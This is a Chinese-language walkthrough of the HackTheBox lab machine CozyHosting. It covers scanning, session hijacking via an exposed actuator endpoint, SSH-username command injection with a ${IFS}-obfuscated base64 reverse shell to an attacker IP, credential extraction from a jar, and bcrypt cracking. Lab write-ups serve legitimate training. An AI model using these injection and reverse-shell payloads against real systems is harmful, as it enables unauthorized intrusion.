---
title: "CozyHosting"
description: "这篇HackTheBox Linux 靶机 CozyHosting 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 CozyHosting 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-10-19T18:48:00+08:00"
publishDate: "2024-10-19T18:48:00+08:00"
lastmod: "2024-10-19T18:48:00+08:00"
url: "/hackthebox/linux/cozyhosting/"
image: "images/oscp-banners/banner-004.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器的端口进行探测检查

```
sudo nmap -p- 10.10.11.230 -open
```

![image-20240919145307632](https://s2.loli.net/2024/09/19/xZQoN4td2AhuSG1.png)

对开放端口进一步进行探测

```
sudo nmap -p22,80  -A 10.10.11.230 -oX CozyHosting.xml
```

![image-20240919145512169](https://s2.loli.net/2024/09/19/Mi3DvtQasCHb614.png)

22端口对应版本号无可以利用的漏洞等，重点关注80端口的服务，优先将cozyhosting.htb加入hosts名单

优先对80端口进行路径扫描

```
dirsearch -u http://cozyhosting.htb/
```

![image-20240919150936539](https://s2.loli.net/2024/09/19/vHWaOudED7kUrNB.png)

除了

/login

/admin

主要就是/actuator目录下存在内容，逐个进行查看

```
http://cozyhosting.htb/actuator/sessions(貌似是一个会话ID和用户名)
E5EE94EFC1F403B9B002E3A417B4CE6F	"kanderson"

```

![image-20240919160644100](https://s2.loli.net/2024/09/19/hYvobF4AqRmp8uL.png)

尝试在web端使用上述的用户名或者会话SEESIONid进行替换，尝试是否可以登录

![image-20240919160811615](https://s2.loli.net/2024/09/19/rQTAhRCFYa3B9ZP.png)

成功利用这个会话session登录

![image-20240919161523859](https://s2.loli.net/2024/09/19/4IYlF9RdCTcsgJM.png)

页面下存在一个功能，能够访问hostname，考虑此处可能存在命令注入

![image-20240919161607709](https://s2.loli.net/2024/09/19/5qejsT8t3JSV9db.png)

根据返回的提示，返回了一个ssh的报错，看来是用username的部分作为ssh的登录名，所以username的入参可以考虑命令注入，同时从反复的输入中可以观察到hostname必须正确

考虑到服务端应当是在运行

SSH username@hostname 命令，所以使用拼接bash命令进行尝试

![image-20240919162642036](https://s2.loli.net/2024/09/19/nlgYbZI2As8z6aX.png)

提示username不允许包含空格，经过查找对应空格需要用${IFS}进行替换

![image-20240919163144515](https://s2.loli.net/2024/09/19/JcKPAydvhkogW95.png)

提示-c命令不允许使用，使用busybox的shell会存在链接就断链的问题

```
echo '/bin/sh -i >& /dev/tcp/10.10.16.15/12345 0>&1' | base64
echo${IFS}'L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNS8xMjM0NSAwPiYxCg=='|base64${IFS}-d|bash;
```

![image-20240919165028422](https://s2.loli.net/2024/09/19/5mdMfBsA9icVyIz.png)

同时对username后续的内容进行下url encode，成功反弹回shell，优先进行下shell升级

![image-20240919165148266](https://s2.loli.net/2024/09/19/EAwyeC6dVftoGSx.png)

可以看到具有bash权限的主要有三个用户，要获取flag，优先需要进行横向移动

![image-20240919165324202](https://s2.loli.net/2024/09/19/1nzLaN9gvHMGhrw.png)

在app目录存在一个jar包，尝试把这个文件下载下来

```
python3 -m http.server 1234
wget http://10.10.11.230:1234/cloudhosting-0.0.1.jar
```

这里可以用jd-gui来逐个查看文件，也可以使用unzip来解压查看，最终在一个配置文件中发现postgresql的一个用户和密码

![image-20240919213413742](https://s2.loli.net/2024/09/19/oGV87OwsZxAjdgk.png)

user：postgres

passwd：Vg&nvzAQ7XxR

尝试使用上述用户密码在本地进行登录

```
psql -h 127.0.0.1 -U postgres
\l
\c cozyhosting
```

![image-20240919170900116](https://s2.loli.net/2024/09/19/Ox15S4IEplcUReG.png)

成功登录，在user标下获取到对应的用户名和密码制作成hash，使用john进行破解

![image-20240919173914258](https://s2.loli.net/2024/09/19/1J5jbudC9qHRLPE.png)

```
$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

根据以上两个hash破解的结果，可以获取到一个密码，考虑到服务端只有三个用户注意进行尝试

![image-20240919174048230](https://files.seeusercontent.com/2026/04/07/Qwh3/image-20240919174048230.png)

密码：manchesterunited

成功登录相应的主机，获取相应flags：a52617f1789012dd21e2300be4358a72

需要提升到root，尝试sudo -l，返回以下内容

![image-20240919173305231](https://s2.loli.net/2024/09/19/DokhW1SNn4CYqsp.png)

![image-20240919173321836](https://s2.loli.net/2024/09/19/4InuQZrvcsLjW5D.png)

成功突破边界，获取到root的flag：20d59dd8a6a641f85b434c214914254f

![image-20240919173407741](https://s2.loli.net/2024/09/19/IqbeZxXf936yaRM.png)

